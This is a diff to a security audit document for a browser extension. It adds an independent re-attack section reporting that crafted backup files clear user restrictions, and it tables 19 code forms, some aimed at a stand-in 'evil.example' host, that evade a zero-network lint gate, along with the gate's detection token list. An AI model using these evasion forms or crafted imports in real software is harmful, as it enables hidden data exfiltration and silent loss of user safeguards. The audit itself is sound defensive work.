@@ -6,6 +6,12 @@
 > **S12 REMEDIATION (separate lane):** F-V19-1 (MEDIUM) and F-V19-2 (LOW) are **FIXED** at the
 > post-fix revision — see the status + proof in §9 and the gate re-run / falsifications in §10.1.
 > The audit's own findings and evidence below are unchanged.
+> **S13 INDEPENDENT RE-ATTACK (separate lane, maker ≠ judge, OWN probes):** re-attacked at the
+> post-fix revision `10e0e07` (see §13). Re-bound verdicts: **F-V19-1 = PARTIALLY_FIXED** (the
+> whitelist lag IS closed, but a crafted file now **CLEARS** stored restrictions → NEW
+> **F-V19-5 (MEDIUM)**), **F-V19-2 = PARTIALLY_FIXED** (the reported alias blind spot is closed;
+> the fetch-family class is still evadable), + NEW **F-V19-6 (LOW)**. §9/§10.1 keep the S12
+> claims verbatim; §13 is the re-attack evidence.
 > **Prior evidence is PRIOR EVIDENCE ONLY** (redteam v1–v4, the v1.6/v1.7 security rounds). Every
 > previously-closed finding is **re-attacked at THIS revision** (§8); no old PASS is re-cited as fresh.
 
@@ -418,6 +424,21 @@ CALL (click/type/submit) → REAL EFFECT (approval granted / message sent)`.
   **Falsification:** stripping the two new blocks from a mutated copy
   (`stats_nov19keys.js`) turns **13** of the new assertions RED (exit 2) while the shipped file is
   **50/50 green** (§10.1).
+- **Status at `10e0e07` (S13 re-attack): PARTIALLY_FIXED.** The whitelist lag itself **is**
+  closed (S13 evidence, own probes): an 11-key v1.8/v1.9 config round-trips, and a file of ONLY
+  `followupSchedule`+`missionEnabled`+`mission`+`userLocale` imports **end-to-end through the real
+  handler** (no "Not a backup", `missionEnabled`/`userLocale`/mission state applied, schedule
+  applied at boot). **BUT** the fix's third stated invariant — *"a present-but-INVALID value is
+  DROPPED (never emitted as a reset-to-default) so a crafted file cannot use junk to CLEAR a user
+  restriction"* — is **falsified** for the three CONTAINER keys (`rules`, `followupSmart`,
+  `followupSchedule`): the sanitizer emits a partially/fully-empty container whenever the container
+  is present as an object, which **overwrites** the stored container, so the engine's next boot
+  resets the missing sub-keys to their defaults. 13 of my 16 crafted files clear a restriction
+  (allowTopics whitelist / custom blockKeywords / the send-window schedule / the smart config); the
+  pre-fix blob (`9e6b151`, stats.js `a47da7aa…`) clears **NONE** of them → a new fail-open
+  introduced by the remediation. **New finding: F-V19-5 (MEDIUM), §13.3.** The scalar keys
+  (`dryRun`/`pauseUntil`/`userLocale`/booleans) and `mission` **do** behave as claimed (dropped,
+  never reset) — verified.
 
 ### F-V19-2 — **LOW** · The "zero-network" lint gate is blind to the aliased `fetch`
 - **Class:** assurance-gate false-negative (supply chain / no-remote-primitive invariant).
@@ -454,6 +475,17 @@ CALL (click/type/submit) → REAL EFFECT (approval granted / message sent)`.
   ("forbidden primitive /\bfetch\s*\(/" + "bare fetch( call"); the copy with
   `readAsset('https://evil.example')` ⇒ **exit 1** ("aliased fetch without a same-package URL");
   the restored copy ⇒ **exit 0** (§10.1).
+- **Status at `10e0e07` (S13 re-attack): PARTIALLY_FIXED.** The **reported defect is closed** —
+  my own catalogue re-ran the real gate on a real copy of the package: the approved binding + a
+  `chrome.runtime.getURL(...)` argument stays clean (no false positive), while an alias re-pointed
+  at a remote URL and an alias called with no argument are both flagged. **BUT** the *class* the
+  recommendation named is still evadable by one token: `const rf = globalThis.fetch;`
+  (no `.bind(`) is **not** tracked, so `rf('https://evil.example')` keeps the gate at **exit 0**
+  — likewise `window['fetch'](…)`, `const {fetch: f} = window`, `navigator.sendBeacon`,
+  `new EventSource`, `new Image().src`, `import('https://…')`, a remote `<script src>` built in a
+  `.js` file, and `(0,eval)('fetch')`. 13 of my 19 attack forms are MISSED with the gate green
+  (§13.4, with the caught / missed-but-unreachable / real-gap classification). None of the missed
+  forms exists anywhere in the shipped package today (verified by repo-wide grep).
 
 ### F-V19-3 — **INFO** · Adaptive fast-path sweep reduces the card-mutation settle window to ~0 ms
 - **Class:** reliability / TOCTOU (Chain I).
@@ -602,3 +634,269 @@ re-attack.
 
 **PHASE STATUS: AUDIT COMPLETE at `9e6b151` (v1.9.1) — remediation (S12) + independent re-attack
 (S13) + rebind at the post-fix revision are required before any GO verdict is issued.**
+
+### 12.1 S13 RE-BIND AT THE POST-FIX REVISION `10e0e07` (this lane's verdict — §13)
+
+- **F-V19-1 (MEDIUM, was fail-open) → `PARTIALLY_FIXED`.** The whitelist lag is closed (a
+  v1.8/v1.9-only backup now imports end-to-end); the fix's "junk cannot CLEAR a restriction"
+  invariant holds for the scalar keys and `mission` but **fails for the three container keys** →
+  NEW **F-V19-5 (MEDIUM)**, a fail-open introduced by the remediation (pre-fix: 0 crafted files
+  cleared a restriction; post-fix: 13/16 do).
+- **F-V19-2 (LOW, gate false-negative) → `PARTIALLY_FIXED`.** The reported aliased-fetch blind
+  spot is closed and self-proven; the fetch-family *class* is still evadable in 13 of my 19 forms
+  with the gate green — classified honestly in §13.4 (caught / missed-but-unreachable /
+  missed-and-real-gap). The gate was **not** weakened; the package is unchanged and green.
+- **NEW F-V19-6 (LOW)** — the `LOCALE_IDS` mirror guard is bound to a hardcoded literal, not to
+  the shipped locale set → a newly shipped locale drifts silently and the guard stays green.
+- **Carried over unchanged:** F-V19-3 (INFO, `NOT_VERIFIED` beyond the fixture) and F-V19-4
+  (INFO, multi-frame caps `NOT_VERIFIED`).
+- **Free-go-live axis:** unchanged in kind — still GO-equivalent for a FREE launch **only** with
+  the open items owned; the new MEDIUM joins the CONDITIONAL list (it needs a sanitizer decision,
+  see §13.3 fix direction). **Paid path: `NOT_VERIFIED` / `NOT_APPLICABLE`** (no money path; §7).
+- **No old PASS is re-cited:** every gate in §13.6 was re-executed by this lane at `10e0e07`.
+
+---
+
+## 13. S13 — INDEPENDENT RE-ATTACK AT THE POST-FIX REVISION (`10e0e07`)
+
+**Lane discipline:** maker ≠ judge. Own probes, own vectors — nothing reused from the S12 lane.
+Everything lives in a scratch dir (`…/cache/scratch/maa_s13/`); nothing was written to
+`extension/**`, `scripts/**`, `test/**`, `store/**`; no git operation was run. The only file this
+lane edits is this document.
+
+### 13.0 REVISION BINDING
+
+| Item | Value |
+|---|---|
+| Repo | `C:/00. AI Project/PRJ_AutoAllowMUSE` (public), branch `main` |
+| **HEAD (frozen for S13)** | `10e0e07` — "fix(security): F-V19-1 import sanitizer whitelist + F-V19-2 zero-network gate" |
+| Parent (the audit revision) | `9e6b151` (v1.9.1 packet sync) |
+| sha256 `extension/stats.js` | `ed84c2516808b1f05a1b7c0e04ca596a4ce93543520624f8281cb15b914d92ea` (S12 changed it; was `a47da7aa…`) |
+| sha256 `scripts/lint.mjs` | `924815d98003210e85adf064bdd598644ad93af7e2f9801616d39706ba72d081` (S12 changed it; was `b27792c1…`) |
+| sha256 `extension/content.js` | `92fc55638020dfa9d3a702a4eec6b18c12a41527353a10462314c0fb32ab2eb1` (unchanged by S12) |
+| sha256 `test/import-security.mjs` | `1b88aa2fbb6c92bfc3d972f4d958417d412619ca88d31476cfaa8f838f838a54` |
+| Pre-fix contrast blob | `git show 9e6b151:extension/stats.js` (stats.js `a47da7aa…`), run through the same probe |
+
+**`VERIFIED_ON` = `10e0e07` (S13).** `DISCOVERED_ON` = `9e6b151` (S1). No prior PASS is re-cited.
+
+### 13.1 METHOD — three probes, all driven against the REAL frozen code
+
+1. `probe_s13_import2.mjs` — runs the **whole real `extension/stats.js`** in a `vm` with this
+   lane's own `chrome`/DOM stubs, so the **real `importFile` `change` handler** is exercised; and
+   in a second `vm` it runs the **real engine readers sliced out of `content.js`**
+   (`asObj`, `sanitizeList`, `hourOf`, `applyV18Settings`, the `v18` defaults, `MISSION_CORPUS`,
+   `sanitizeMission`, `applyMissionSettings`), modelling the engine exactly as
+   `content.js:1569` (boot read of `{pauseUntil, dryRun, allowOnceMode, rules, followupSmart,
+   followupSchedule, missionEnabled, mission}`) + `:1601-1612` (the per-key `onChanged` patch).
+   The "restriction" metric is the conjunction of a user's tightened settings *after a boot*, so a
+   clear is only reported when the engine really loses the restriction on its next start.
+2. `probe_s13_lint.mjs` — a **real copy** of `scripts/lint.mjs` over a **real copy** of
+   `extension/`; for each network/fetch-family form a vector file is added to the copied package
+   and the real gate is run (exit code + findings naming the vector file).
+3. `probe_s13_mirror.mjs` — a fresh copy of `extension/` + the **real** `test/import-security.mjs`;
+   each mirror mutation is applied to the copy only, then the real guard is run.
+
+### 13.2 F-V19-1 — what the fix DID close (own evidence, no S12 vectors reused)
+
+- **All 11 v1.8/v1.9 keys round-trip (own probe `probe_s13_roundtrip.mjs`):** a full config
+  (`pauseUntil`, `dryRun`, `allowOnceMode`, `syncSettings`, `missionEnabled`, `onboarded`,
+  `userLocale`, `rules`, `followupSmart`, `followupSchedule`, `mission`) → sanitizer keeps all 11
+  byte-for-byte (0 misses) → the **real handler** writes all 11 into storage identically (0 misses,
+  0 alerts) → the **engine boot** applies them exactly (`dryRun:true`, `pauseUntil` intact,
+  `allowTopics`/`blockKeywords` verbatim, `stuckPrompt`/`errorRecovery` intact, schedule
+  `{enabled:true,start:9,end:17,onlyActiveTab:true}`, `missionId:'golive-ready' step 2 cycle 1`).
+- **v1.8/v1.9-only file imports end-to-end through the REAL handler** — a file of ONLY
+  `{followupSchedule:{enabled:true,start:9,end:17,onlyActiveTab:true}, missionEnabled:true,
+  mission:{id:'audit-only',step:1,cycles:0,startedAt:1,lastSentAt:0}, userLocale:'ko'}` →
+  **0 alerts**, storage gets `missionEnabled:true` + `userLocale:'ko'` + the mission, and the
+  engine boot applies `schedule.enabled:true, start:9, end:17` and `missionId:'audit-only',
+  step:1`. (On the pre-fix blob the same file is refused as "Not a backup" — the original
+  F-V19-1 repro still reproduces there, which is the RED contrast for the fix.)
+- **Scalar keys and `mission` behave as the fix claims (dropped, never reset):** `pauseUntil:'soon'`,
+  `dryRun:'true'`, `userLocale:'AUTO'/'EN'/'xx'`, `mission:{}`, an upper-case mission id, and a
+  mission with extra unknown sub-keys are all either dropped or normalised to the engine's own
+  accepted shape; a file of only junk scalars is refused outright (`seen === 0` → `null`), and
+  none of them clears the stored value (controls A12/A15/A16 → restriction intact).
+- **No prototype pollution:** `__proto__` / `constructor` / `prototype` carriers inside `rules`,
+  `followupSmart`, `followupSchedule`, `mission` leave `Object.prototype` untouched.
+- **Boundary fuzz vs the engine's accepted domain** (20 cases): the sanitizer is at worst
+  *stricter* than the engine, never looser — e.g. `pauseUntil:'1000'` is dropped by the sanitizer
+  while the engine would `Number`-coerce it to 1000 (a conservative drop, the stored value is
+  preserved); `mission.step:'2'`, `mission.cycles:true`, `schedule.start:'9'`, `start:23.0`,
+  `stuckMin:-0` all agree with the engine's own coercion; `allowTopics` caps at 50 × 64 chars and
+  `blockKeywords` at 500 exactly as `content.js:149-150/378-388` do; `schedule.end:24` is dropped
+  and the engine defaults it to 18 (no divergence in effect). The one non-security asymmetry is
+  pre-existing and untouched by this fix: `followupPrompt` is capped at 4000 chars by the
+  sanitizer while `content.js:1421` accepts any length.
+
+### 13.3 NEW FINDING **F-V19-5** — **MEDIUM** · the sanitizer's container emission **CLEARS** stored restrictions
+
+- **Class:** import / fail-open on a user restriction (the exact class F-V19-1 was raised for —
+  reached through the new code path). A **regression introduced by the S12 remediation** in this
+  dimension.
+- **File:line:** `extension/stats.js:305-311` (`const rules = plainObj(d.rules); … out.rules = r;
+  seen++;`), `:312-320` (`followupSmart`), `:321-329` (`followupSchedule`) — the containers are
+  emitted **unconditionally** whenever `plainObj()` returns an object, even when every sub-value
+  was rejected. Engine side: `extension/content.js:1569` (boot read with `rules: {}` /
+  `followupSmart: {}` / `followupSchedule: {}` defaults) + `:392-420` (`applyV18Settings`'s
+  presence test `if ('allowTopics' in rules)`), and the storage overwrite at `stats.js:398`
+  (`chrome.storage.local.set(clean)`).
+- **Issue:** the fix's stated invariant is *"a present-but-INVALID value is DROPPED (never emitted
+  as a reset-to-default) so a crafted file cannot use junk to CLEAR a user restriction."* That
+  holds for scalars, but **not** for the three container keys: `rules`/`followupSmart`/
+  `followupSchedule` are always emitted as an object when present, so a container whose sub-values
+  are junk (or absent) is written into storage as a **partial/empty** object. Because the engine's
+  reader is *presence-aware* (`if ('allowTopics' in rules)`), the **missing sub-key** is exactly
+  what makes the engine fall back to its default on the next boot — i.e. `allowTopics` → `[]`
+  (= no topic restriction), `blockKeywords` → the seed list, `schedule` → `{enabled:false, 8, 18}`,
+  `smart` → the shipped prompts with `errorRecovery:false`.
+- **Repro (executed, own probe):** a stored state with every v1.8 restriction tightened, then each
+  crafted file imported through the **real handler** and the engine booted. **13 of 16 crafted
+  files cleared a restriction**; the pre-fix blob cleared **0 of 16**:
+
+  | crafted `data` | sanitizer emitted | engine state after the next boot |
+  |---|---|---|
+  | `{rules:{allowTopics:"nope"}}` | `{rules:{},schemaVersion:2}` | **allowTopics `[]`** (whitelist gone → every topic allowed); custom `blockKeywords` lost (seed re-applied) |
+  | `{rules:{allowTopics:"nope",blockKeywords:["keepme"]}}` | `{rules:{blockKeywords:["keepme"]}}` | **allowTopics `[]`**; blocklist replaced by the file's list |
+  | `{rules:{}}` | `{rules:{}}` | **allowTopics `[]`** + custom blocklist lost |
+  | `{rules:{allowTopics:[["repo-x"],5,null,{}, "  "]}}` | `{rules:{allowTopics:[]}}` | **allowTopics `[]`** |
+  | `{rules:{allowTopics:["repo-x"]}}` (no `blockKeywords`) | `{rules:{allowTopics:["repo-x"]}}` | custom blocklist lost → seed re-applied (fail-closed-ish, still a silent config loss) |
+  | `{rules:{blockKeywords:[]}}` | `{rules:{blockKeywords:[]}}` | **blocklist empty → nothing blocked** (note: an empty blocklist is also reachable from the popup UI, so this facet alone is not a new primitive) |
+  | `{rules:{"__proto__":{…}}}` / `{rules:{constructor:{…}}}` | `{rules:{}}` | **allowTopics `[]`** (no prototype pollution) |
+  | `{followupSchedule:{enabled:"yes"}}` | `{followupSchedule:{}}` | **schedule `{enabled:false,start:8,end:18,onlyActiveTab:false}`** — the send-window restriction is gone |
+  | `{followupSchedule:{start:99}}` | `{followupSchedule:{}}` | same — schedule cleared |
+  | `{followupSmart:{stuckMin:"x"}}` / `{followupSmart:{errorRecovery:"yes"}}` | `{followupSmart:{}}` | smart config reset to the shipped defaults (user prompts lost, `errorRecovery:false`) |
+  | controls `{mission:{}}`, `{pauseUntil:"soon"}`, `{dryRun:"true"}` | `null` → "Not a backup" | **restriction intact** — the asymmetry is specific to the three container keys |
+
+- **Impact:** after a restore the extension can **click approvals for topics the user excluded**
+  (`allowTopics` cleared) and **send follow-ups outside the user's schedule window**
+  (`schedule.enabled` cleared) — a fail-open on a user-configured restriction, on the next
+  content-script boot. Same precondition model as V4-1/F-V19-1: a crafted backup file the user
+  picks + one `confirm()`. An **honest** backup is unaffected (popup.js:829 always writes both
+  `rules` sub-keys; :888/:901 write whole `followupSchedule`/`followupSmart` objects), so this is
+  a crafted/partial-file fail-open, not an honest-backup one.
+- **Fix direction (NOT applied here — this lane's write set is this document):** emit a container
+  only when it has ≥ 1 accepted sub-key, and preserve the "absent" semantics instead of writing a
+  partial object (i.e. drop the container rather than emit an empty one — the engine's `in` test
+  is what converts "absent" into "reset to default"); alternatively merge the import at sub-key
+  granularity. The `blockKeywords: []` facet should be decided explicitly (the engine honours an
+  empty list as "nothing blocked"; `content.js:401`'s comment claims the list "is never
+  truncated" yet an empty list unblocks everything).
+- **Severity rationale:** MEDIUM — the same class and impact as F-V19-1 (fail-open on a user
+  safety restriction after a documented "replace" restore), requires the user to import a file,
+  and is **newly reachable** at this revision.
+
+### 13.4 F-V19-2 — the gate's real coverage, classified honestly
+
+The real gate (`scripts/lint.mjs`, unmodified) was run over a real copy of the package with one
+vector per form. Baseline (no vector): **exit 0**. Controls behave correctly: the approved
+`<g>.fetch.bind(<g>)` + `chrome.runtime.getURL(...)` pair is **clean** (no false positive), an
+alias called with no argument and an alias re-pointed at a remote URL are both **flagged**.
+**13 of 19 attack forms are MISSED with the gate at exit 0.**
+
+| # | vector | gate | classification |
+|---|---|---|---|
+| 1 | `globalThis.fetch('https://…')` | CAUGHT (`/\bfetch\s*\(/`) | — |
+| 2 | `new WebSocket(…)` / `importScripts(…)` / `new XMLHttpRequest()` | CAUGHT | — |
+| 3 | approved alias called with a remote URL / with no argument | CAUGHT (alias-arg rule) | — |
+| 4 | `const rf = globalThis.fetch; rf('https://evil.example/x')` | **MISSED** | **(iii) real gap** — a plain fetch acquired without `.bind(`, i.e. the very class the new rule targets, one token from the approved spelling |
+| 5 | `window['fetch']('https://…')` | **MISSED** | **(iii) real gap** — a plain fetch call; the bracket form puts a quote between `fetch` and `(`, defeating both regexes |
+| 6 | `const {fetch: f} = window; f('https://…')` | **MISSED** | **(iii) real gap** — a natural alias spelling the rule does not model |
+| 7 | `navigator.sendBeacon('https://…', …)` | **MISSED** | **(iii) real gap** — an unmodelled network primitive (CSP does not block it) |
+| 8 | `new EventSource('https://…')` | **MISSED** | **(iii) real gap** — unmodelled network primitive |
+| 9 | `new Image().src = 'https://…/?d=' + …` | **MISSED** | **(iii) real gap** — an unmodelled exfil channel |
+| 10 | `import('https://evil.example/x.js')` | **MISSED** | **(iii) real gap** — remote module load |
+| 11 | `createElement('script').src='https://…'` (in a `.js`) | **MISSED** | **(iii) real gap** — the remote-`<script src>` rule only scans `.html`; second layer = the CSP `script-src 'self'` |
+| 12 | `document.body.innerHTML='<script src="https://…">'` (in a `.js`) | **MISSED** | **(iii) real gap** — same, obfuscated |
+| 13 | `(0,eval)('fetch')('https://…')` | **MISSED** | **(iii) real gap** — indirect eval also evades the pre-existing `/\beval\s*\(/` rule |
+| 14 | `Reflect.get(globalThis,'fetch')(…)` | **MISSED** | (ii) residual/exotic — no token at all; deliberately evasive |
+| 15 | `const n='fet'+'ch'; globalThis[n](…)` | **MISSED** | (ii) residual/exotic — computed member |
+| 16 | `s.src='data:text/javascript,…'` | **MISSED** | (ii) residual — inline-code execution, no network; CSP-blocked on extension pages |
+
+**Reachability today (verified, not assumed):** a repo-wide grep of `extension/**` for every token
+in the MISSED rows (`sendBeacon`, `EventSource`, `new Image`, `createElement('script')`,
+`Reflect.get`, `import(`, `{fetch:` / `{ fetch:`, `innerHTML = '<scr`, `window[`) returns **zero
+hits** — so no missed form is reachable in the shipped zero-dep package today. The (iii) rows are
+nevertheless **real gaps in the gate's own stated invariant** ("no remote code / network
+primitives anywhere in `extension/`"): they are the plain, non-adversarial ways a future edit
+could reintroduce a network call, which is precisely the threat model F-V19-2 was raised under.
+**(ii) rows are residual gate limitations, not reachable defects.**
+**The gate was NOT weakened** — the shipped package is unchanged and still exit 0.
+
+### 13.5 MIRROR GUARDS — falsified (one strong, one weak)
+
+Both guards live in `test/import-security.mjs:402-405`. Each mutation was applied to a **copy**
+and the **real** guard was run.
+
+- **`stats.js MISSION_STEPS` ⇄ `content.js MISSION_CORPUS` — STRONG.** F1: adding a 5th mission
+  to `content.js` (`new-mission`, 2 steps) → guard **FAIL** with a readable diff
+  (`corpus:{golive-ready:6,audit-only:4,fix-findings:4,release-prep:4,new-mission:2}` vs
+  `stats:{…4 keys}`), exit 2. F2: dropping one `audit-only` step (4→3) → guard **FAIL**
+  (`audit-only:3` vs `4`), exit 2. An engine-side mission/step drift breaks the guard **loudly**.
+- **`stats.js LOCALE_IDS` ⇄ "the shipped locale set" — WEAK → NEW FINDING F-V19-6 (LOW).** The
+  assertion compares `LOCALE_IDS` to a **hardcoded literal** `['en','vi','zh_CN','ja','ko','es']`,
+  not to the shipped `_locales` directories or to `popup.js:11 LOCALE_IDS`. F3: shipping a 7th
+  locale (`_locales/xx` copied from `en` + `'xx'` added to `popup.js LOCALE_IDS`, `stats.js`
+  untouched) → i18n parity lint **exit 0**, mirror guard **exit 0 (PASS)** — while
+  `sanitizeBackup({userLocale:'xx'})` → **`null`** (dropped), so a legitimate backup of the new
+  locale's choice is silently lost and nothing goes RED. F4: the reverse drift (`'xx'` added to
+  `stats.js LOCALE_IDS` only) → guard **FAIL**, exit 2. The guard therefore pins only one
+  direction, and the sanitizer/engine drift it exists to catch can still happen in the other.
+  **Fix direction:** assert `stats.js LOCALE_IDS` equals `popup.js`'s `LOCALE_IDS` and/or the
+  shipped `_locales` directory set, rather than a literal.
+
+### 13.6 GATES RE-RUN BY THIS LANE AT `10e0e07` (foreground, unpiped)
+
+```
+node scripts/lint.mjs                            exit 0  "lint OK — 24 checks across 18 files (syntax, JSON, i18n parity, no remote code, minimal permissions)"
+node scripts/lint.mjs --self-test                exit 0  "all 3 cases PASS" (shipped clean / raw fetch flagged / readAsset(remote) flagged)
+node test/import-security.mjs                    exit 0  total:50, failed:0
+node test/e2e.mjs                                exit 0  ok:true; forbiddenHit:[]; denyCount:0; connectorCheck.ok:true (blockedConnector:2); encCheck.ok:true; statsPage.ok:true; locksProbe:true; n7count:1; n11count:1; orderOk:true; dedupSepOk:true
+node test/followup-e2e.mjs                       exit 0  ok:true (119 named checks; the 2 nested ok:false are the EXPECTED engine refusals 'composer-not-empty' and 'paused', each inside a PASSING check)
+node test/lang-switch-e2e.mjs                    exit 0  passed:36, failed:0, failedChecks:[]
+node test/background-unit.mjs                    exit 0  total:29, failed:0
+node test/mission-e2e.mjs                        exit 0  ok:true; 39 named checks; verifyTimeouts:[]; preflight corpus 4 ids / 18 steps / flagged:[] / controlPositive:2 / controlNegative:0
+node scripts/bench/experience.mjs --only=assert  exit 0  pass:22, fail:0
+```
+
+**Environment:** Windows 11, git-bash/MSYS, Node **v26.7.0**, installed Chrome (CDP
+`Extensions.loadUnpacked`, scratch profile — the user profile was never touched). Zero-dependency
+repo; no bootstrap needed. All Chrome suites ran **foreground/unpiped** and returned real JSON.
+(One earlier attempt to batch three suites with a 900 s timeout was auto-promoted to a background
+process and the suites then died with no output — the non-TTY caveat is real for background/piped
+runs; re-run foreground, they pass.)
+
+### 13.7 RESIDUAL GATE LIMITATIONS (explicit)
+
+1. **`scripts/lint.mjs` is a text-token lint, not a sandbox.** It enforces "zero network / no
+   remote code" only for the token set it models (`fetch(`, `.fetch`, `eval(`, `new Function(`,
+   `XMLHttpRequest`, `new WebSocket(`, `importScripts(`, remote `<script src>` in `.html`, plus
+   the new bound-alias rule). The 13 missed forms in §13.4 stay green; the CSP
+   (`script-src 'self'; object-src 'self';`) is a real second layer only for extension-page
+   *script* injection, not for `sendBeacon`/`EventSource`/`Image`/`import()`.
+2. **The new alias rule keys on the exact spelling `<g>.fetch.bind(<g>)`.** Any other acquisition
+   (`= globalThis.fetch`, destructuring, bracket access, `Reflect.get`) is untracked, so the
+   "every fetch-family call must pass `chrome.runtime.getURL(...)`" assertion only holds for that
+   one spelling.
+3. **The `LOCALE_IDS` mirror guard pins a literal, not the shipped set** (§13.5 / F-V19-6).
+4. **Unchanged and carried:** F-V19-3 (fast-path settle window, `NOT_VERIFIED` beyond the
+   fixture), F-V19-4 (per-instance/per-frame caps, `NOT_VERIFIED` multi-frame), V4-2 merge
+   semantics + import outside the page Web Lock, SA-1 R-1 (a self-consistent crafted file still
+   rotates the key), Chain D/E/F boundaries, and the settings-sync account boundary (§11).
+5. **Not re-attacked by this lane (out of the S13 charter):** the Chains A–I runtime rails beyond
+   re-running their suites, the artifact byte-verify/zip, and the paid path (§7 stays N/A).
+
+### 13.8 S13 VERDICT (this lane, bound to `10e0e07`)
+
+| Finding | S12 claim | **S13 re-bind** | Own evidence |
+|---|---|---|---|
+| **F-V19-1** (MEDIUM) | FIXED | **PARTIALLY_FIXED** | whitelist lag closed + v1.9-only end-to-end import (own probe); container emission clears restrictions 13/16 (pre-fix 0/16) → **F-V19-5** |
+| **F-V19-2** (LOW) | FIXED | **PARTIALLY_FIXED** | reported alias blind spot closed (self-test + own catalogue); 13/19 attack forms missed with the gate green, none present in the package |
+| **F-V19-5** (NEW, MEDIUM) | — | **OPEN** | §13.3 table; regression vs the pre-fix blob |
+| **F-V19-6** (NEW, LOW) | — | **OPEN** | §13.5 F3/F4 |
+| F-V19-3 (INFO) | `NOT_VERIFIED` | `NOT_VERIFIED` (unchanged) | not re-probed |
+| F-V19-4 (INFO) | `NOT_VERIFIED` | `NOT_VERIFIED` (unchanged) | not re-probed |
+
+**No old PASS is re-cited as fresh evidence anywhere in this section.** Every gate line in §13.6
+and every probe result above was produced by this lane at `10e0e07`; the S12 claims in §9/§10.1
+are preserved verbatim and are superseded only where §13 states a re-bound verdict.
